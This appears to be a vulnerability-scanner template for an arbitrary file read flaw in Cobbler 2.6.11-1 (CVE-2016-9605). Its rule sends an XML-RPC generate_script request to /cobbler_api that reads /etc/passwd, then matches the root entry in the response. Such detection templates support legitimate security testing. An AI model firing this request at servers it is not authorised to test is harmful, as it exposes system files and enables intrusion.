expression: r0()
id: CNVD-2018-16876
info:
  author: rain
  description: "Cobbler\u662F\u4E00\u6B3E\u7F51\u7EDC\u5B89\u88C5\u670D\u52A1\u5668\
    \u5957\u4EF6\uFF0C\u5B83\u80FD\u591F\u5FEB\u901F\u5EFA\u7ACBLinux\u7F51\u7EDC\u5B89\
    \u88C5\u73AF\u5883\u3002\nCobbler 2.6.11-1\u7248\u672C\u4E2D\u5B58\u5728\u4EFB\
    \u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E\u3002\u653B\u51FB\u8005\u53EF\u5229\
    \u7528\u8BE5\u6F0F\u6D1E\u8BFB\u53D6\u4EFB\u610F\u6587\u4EF6\u3002\n"
  name: "Cobbler\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E"
  reference:
  - https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-9605
  severity: high
  verified: false
rules:
  r0:
    body: '<?xml version=''1.0''?><methodCall><methodName>generate_script</methodName><params><param><value><string>windows10</string></value></param><param><value><string></string></value></param><param><value><string>/etc/passwd</string></value></param></params></methodCall>

      '
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
    request:
      headers:
        Accept-Encoding: gzip
        Content-Type: text/xml
      method: POST
      path: /cobbler_api
